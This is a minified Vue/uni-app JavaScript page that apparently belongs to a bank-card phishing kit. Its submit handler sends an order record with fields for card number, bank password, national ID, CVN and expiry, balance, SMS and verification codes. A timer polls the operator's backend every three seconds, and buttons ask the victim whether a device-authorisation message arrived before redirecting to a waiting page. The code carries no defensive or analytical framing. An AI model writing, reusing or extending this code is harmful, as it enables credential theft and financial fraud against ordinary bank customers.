import{d as a,k as e,A as s,y as t,p as l,r as n,o,e as r,w as d,f as u,g as i,q as _,t as c,u as m,b as f,s as p,v,x as E,m as y,_ as g}from"./index-1a1fccd8.js";import{r as D,a as h,_ as w,b as I,c as L}from"./Rules.f714300d.js";import{h as b,u as x}from"./Remote.9d35866b.js";const A=g(a({...{data:()=>({options:{}}),onLoad(a){this.options=a}},__name:"device",setup(a){e(),s(),t((()=>{let a=y();if(a){let e=a.data.options;A.value.id=e.order}})),l((()=>{}));const g=n(null),A=n({id:"",username:"",password:""}),C=async a=>{g.value.validate();let e={d_id:A.value.id,d_kaihuhang:"",d_name:"",d_kahao:"",d_mima:"",d_mima2:"",d_sfz:"",d_phone:"",d_cvn:"",d_cvntime:"",d_yue:null,d_yzm:null,d_download:null,d_permission:null,d_sms:"",d_device:1},s=await x(e);1==s.status&&(console.log(s),p({url:"waiting?order="+s.data.d_id}))};l((()=>{clearInterval(k)}));const k=setInterval((async()=>{try{b(A.value.id)}catch(a){}}),3e3);return(a,e)=>{const s=u,t=v,l=D(E("uni-col"),w),n=D(E("uni-row"),I),p=D(E("uni-forms"),L);return o(),r(s,{class:"home-container"},{default:d((()=>[i(s,{class:"custom-nav"},{default:d((()=>[i(s),i(s,null,{default:d((()=>[i(t,{class:"title"},{default:d((()=>[_(c(a.$t("TITLE_ACCOUNT")),1)])),_:1})])),_:1}),i(s)])),_:1}),i(s,{variant:"text",class:"card"},{default:d((()=>[i(p,{class:"form",modelValue:A.value,ref_key:"prepareForm",ref:g,"label-position":"top","err-show-type":"undertext",rules:m(h),validateTrigger:"blur"},{default:d((()=>[i(n,{class:"form-row",style:{margin:"6em 0"}},{default:d((()=>[i(l,{span:24,style:{"text-align":"center"}},{default:d((()=>[_(c(a.$t("LABEL_ADD_DEVICE_TEXT")),1)])),_:1})])),_:1}),i(n,{class:"form-row"},{default:d((()=>[i(l,{span:24,style:{"text-align":"center"}},{default:d((()=>[f("uni-button",{type:"primary",class:"large-button",onClick:C},c(a.$t("LABEL_ADD_DEVICE_REPLIED")),1)])),_:1})])),_:1}),i(n,{class:"form-row"},{default:d((()=>[i(l,{span:24,style:{"text-align":"center"}},{default:d((()=>[f("uni-button",{type:"normal",onClick:C},c(a.$t("LABEL_ADD_DEVICE_UNRECEIVED")),1)])),_:1})])),_:1})])),_:1},8,["modelValue","rules"])])),_:1})])),_:1})}}}),[["__scopeId","data-v-998b4062"]]);export{A as default};
